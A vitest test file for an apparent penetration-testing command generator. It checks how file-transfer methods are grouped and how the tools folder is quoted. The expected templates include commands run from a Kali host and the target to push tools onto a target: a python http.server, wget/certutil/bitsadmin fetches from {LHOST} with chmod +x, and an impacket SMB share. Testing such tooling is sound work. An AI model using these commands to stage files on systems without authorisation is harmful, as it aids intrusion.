import { afterEach, describe, expect, it } from 'vitest';
import { transferMethods, withToolsDirs } from '../../../engines/generators/transfer';
import { BUILTIN_LIBRARY } from '../../../engines/library/data';
import { FIELD_MANUAL_CARDS } from '../../../engines/library/data/fieldManual';
import { getCards, getLibrary, setImported } from '../../../engines/library/store';
import type { LibraryCommand } from '../../../engines/library/types';

const win = () => transferMethods(FIELD_MANUAL_CARDS, BUILTIN_LIBRARY, 'windows');
const lin = () => transferMethods(FIELD_MANUAL_CARDS, BUILTIN_LIBRARY, 'linux');

afterEach(() => setImported({ commands: [], cards: [] }));

describe('transferMethods', () => {
  it('HTTP group yields one method per target block sharing the serve block', () => {
    const http = win().filter((m) => m.group === 'HTTP (default)');
    expect(http.map((m) => m.target.length)).toEqual([1, 1, 1, 1, 1, 1, 1]);
    expect(http.map((m) => m.label)).toEqual([
      'Invoke-WebRequest', 'PowerShell from a cmd shell', 'Net.WebClient', 'Load a PowerShell script into memory', 'certutil', 'bitsadmin', 'curl.exe',
    ]);
    for (const m of http) expect(m.kali.map((c) => c.template)).toEqual(['cd ~/tools/windows && python3 -m http.server 80']);
    expect(new Set(http.map((m) => m.id)).size).toBe(7);
    const linHttp = lin().filter((m) => m.group === 'HTTP (default)');
    expect(linHttp.length).toBeGreaterThan(3);
    // Both serve blocks (python and penelope) are in every HTTP method's Kali half, serve command first.
    for (const m of linHttp) expect(m.kali.map((c) => c.template)).toEqual(['cd ~/tools/linux && python3 -m http.server 80', 'penelope -s . -p 80']);
  });

  it('chmod is a trailing step of every Linux HTTP fetch, not a tab of its own', () => {
    const http = lin().filter((m) => m.group === 'HTTP (default)');
    expect(http.map((m) => m.label)).not.toContain('Make the file executable');
    const wget = http.find((m) => m.label === 'wget')!;
    expect(wget.target.map((c) => c.template)).toEqual(['wget http://{LHOST}/{FILE} -O {DEST_DIR}/{FILE}', 'chmod +x {DEST_DIR}/{FILE}']);
    for (const m of http) expect(m.target.at(-1)!.template).toBe('chmod +x {DEST_DIR}/{FILE}');
  });

  it('SMB group is one method with share, net use and copy in order', () => {
    const smb = win().filter((m) => m.group === 'SMB share on Kali');
    expect(smb).toHaveLength(1);
    expect(smb[0]!.kali.map((c) => c.template)).toEqual(['impacket-smbserver share $(pwd) -smb2support -username kali -password kali']);
    expect(smb[0]!.target.map((c) => c.template)).toEqual([
      'net use \\\\{LHOST}\\share /user:kali kali',
      'copy \\\\{LHOST}\\share\\{FILE} {DEST_DIR}\\{FILE}',
    ]);
  });

  it('a Kali-only group has no target half', () => {
    const winrm = win().find((m) => m.group === 'WinRM and penelope sessions')!;
    expect(winrm.kali).toHaveLength(2);
    expect(winrm.target).toEqual([]);
    expect(lin().find((m) => m.group === 'SSH')!.target).toEqual([]);
  });

  it('imported transfer cards override the built-ins', () => {
    const serve = getLibrary().find((c) => c.id === 'fm-shell-file-transfer-to-windows-1')!;
    const extra: LibraryCommand = {
      id: 'fm-shell-file-transfer-to-windows-v99', title: 'Pull with bits', tool: 'Start-BitsTransfer', template: 'Start-BitsTransfer http://{LHOST}/{FILE} -Destination {DEST_DIR}',
      os: 'windows', runFrom: 'target', goals: [], source: 'field-manual', cardId: 'shell-file-transfer-to-windows', tags: ['group:HTTP (default)'],
    };
    setImported({ commands: [{ ...serve, template: 'cd /opt/w && python3 -m http.server 8080' }, extra], cards: [] });
    const http = transferMethods(getCards(), getLibrary(), 'windows').filter((m) => m.group === 'HTTP (default)');
    expect(http).toHaveLength(8);
    expect(http[0]!.kali[0]!.template).toBe('cd /opt/w && python3 -m http.server 8080');
    expect(http[7]!.target[0]!.template).toContain('Start-BitsTransfer');
  });

  it('commands without a group tag land in one Other method', () => {
    const c = (id: string, runFrom: 'attacker' | 'target'): LibraryCommand => ({
      id, title: id, tool: 'x', template: id, os: 'any', runFrom, goals: [], source: 'field-manual', cardId: 'shell-file-transfer-to-linux',
    });
    const m = transferMethods(FIELD_MANUAL_CARDS, [c('a', 'attacker'), c('b', 'target')], 'linux');
    expect(m).toHaveLength(1);
    expect(m[0]).toMatchObject({ group: 'Other', target: [{ id: 'b' }], kali: [{ id: 'a' }] });
  });
});

describe('withToolsDirs', () => {
  const dirs = { windows: '~/tools/windows', linux: '~/tools/linux' };
  it('leaves the default folders alone', () => {
    expect(withToolsDirs('cd ~/tools/windows && python3 -m http.server 80', dirs)).toBe('cd ~/tools/windows && python3 -m http.server 80');
  });
  it('swaps a leading cd for the configured folder, quoting it when needed', () => {
    expect(withToolsDirs('cd ~/tools/windows && x', { ...dirs, windows: '/opt/win' })).toBe('cd /opt/win && x');
    expect(withToolsDirs('cd ~/tools/linux && x', { ...dirs, linux: '~/my tools' })).toBe("cd ~/'my tools' && x");
    expect(withToolsDirs('cd ~/tools/windows && x', { ...dirs, windows: "/o'k" })).toBe("cd '/o'\\''k' && x");
    expect(withToolsDirs('cd ~/tools/windows && x', { ...dirs, windows: '  ' })).toBe('cd ~/tools/windows && x');
  });
  it('only touches a leading cd', () => {
    expect(withToolsDirs('ls ~/tools/windows', { ...dirs, windows: '/opt/win' })).toBe('ls ~/tools/windows');
    expect(withToolsDirs('cd ~/tools/windowsX && x', { ...dirs, windows: '/opt/win' })).toBe('cd ~/tools/windowsX && x');
  });
});
